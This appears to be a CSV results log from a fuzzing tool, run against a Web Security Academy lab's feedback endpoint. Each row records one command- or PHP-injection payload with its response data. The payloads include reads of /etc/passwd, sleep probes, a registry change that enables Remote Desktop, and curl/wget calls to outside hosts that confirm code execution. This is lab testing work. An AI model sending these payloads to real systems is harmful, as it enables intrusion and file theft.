id_fuzz,#,Payload,URL,Method,StatusCode,SearchKeyword_error,SearchKeyword_exception,SearchKeyword_illegal,SearchKeyword_invalid,SearchKeyword_fail,SearchKeyword_stack,SearchKeyword_access,SearchKeyword_directory,SearchKeyword_file,SearchKeyword_not found,SearchKeyword_unknown,SearchKeyword_uid=,SearchKeyword_c:\,SearchKeyword_varchar,SearchKeyword_ODBC,SearchKeyword_SQL,SearchKeyword_quotation mark,SearchKeyword_syntax,SearchKeyword_ORA-,SearchKeyword_111111,SearchKeyword_test,SearchKeyword_test2,SearchKeyword_'||Utl_Http.request('http://<yourservername>') from dual--,TimeDelay,ContentLength
id_fuzz_1,267,phpinfo();,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,268,"<?php system(""cat /etc/passwd"");?>",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,269,"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,270,"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,271,"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,272,"<?php system(""sleep 10"");?>",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,273,"<?php system(""sleep 5"");?>",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,274,"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,275,"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,276,:phpversion();,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,277,`ping 127.0.0.1`,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,278,& ping -i 30 127.0.0.1 &,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,279,& ping -n 30 127.0.0.1 &,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,280,;${@print(md5(RCEVulnerable))};,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,281,"${@print(""RCEVulnerable"")}",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,282,${@print(system($_SERVER['HTTP_USER_AGENT']))},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,283,pwd,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,284,| pwd,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,285,; pwd,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,286,& pwd,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,287,&& pwd,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,288,"",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,289,"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,290,"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,291,"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,292,"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,293,"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,294,"
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,295,route,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,296,| sleep 1,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,297,; sleep 1,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,298,& sleep 1,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,299,&& sleep 1,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,300,sleep 1,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,301,|| sleep 10,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,302,| sleep 10,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,303,; sleep 10,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,304,{${sleep(10)}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,305,& sleep 10 ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,306,&& sleep 10,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,307,sleep 10,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,308,|| sleep 15,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,309,| sleep 15,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,310,; sleep 15,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,311,& sleep 15 ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,312,&& sleep 15,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,313, {${sleep(20)}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,314,{${sleep(20)}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,315, {${sleep(3)}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,316,{${sleep(3)}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,317,| sleep 5,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,318,; sleep 5,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,319,& sleep 5,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,320,&& sleep 5,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,321,sleep 5,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,322, {${sleep(hexdec(dechex(20)))}} ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,323,{${sleep(hexdec(dechex(20)))}} ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,324,sysinfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,325,| sysinfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,326,; sysinfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,327,& sysinfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,328,&& sysinfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,329,;system('cat%20/etc/passwd'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,330,system('cat C:oot.ini');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,331,system('cat config.php');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,332,system('cat /etc/passwd');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,333,|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,334,| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,335,; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,336,& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,337,&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,338,system('curl https://crowdshield.com/.testing/rce_vuln.txt'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,339,system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,340,system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,341,system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,342,systeminfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,343,| systeminfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,344,; systeminfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,345,& systeminfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,346,&& systeminfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,347,system('ls'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,348,system('pwd'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
